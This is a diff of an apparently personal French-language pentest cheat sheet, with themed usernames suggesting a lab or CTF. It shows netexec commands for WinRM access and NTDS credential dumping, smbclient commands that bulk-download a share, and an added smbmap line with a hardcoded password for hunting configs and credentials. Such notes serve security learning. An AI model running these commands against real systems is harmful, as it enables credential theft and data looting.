@@ -20,7 +20,7 @@ nxc winrm $IP -u $USER -p $PASSWORD ## Connexion WinRM
 nxc winrm $IP -u $USER -p $PASSWORD --ntds --user ADMINISTRATOR ## Dump ntds
 ```
 
-## smbclient
+## smb
 
 ```bash
 smbclient //$IP/NAME-SHARE$ -U "$DOMAIN/$USER%$PASSWORD" ## Connexion share SMB
@@ -29,6 +29,8 @@ smbclient //$IP/NAME-SHARE$ -U "$DOMAIN/$USER%$PASSWORD" ## Connexion share SMB
 smb: \> recurse ON  
 smb: \> prompt OFF  
 smb: \> mget *
+
+smbmap -H 10.2.62.237 -u FEYDRAUTHA.HARKONNEN -p schrauth101 -R "Guild Spaceship" # Chercher des fichiers sensibles (configs, creds, scripts) 
 
 ```
 
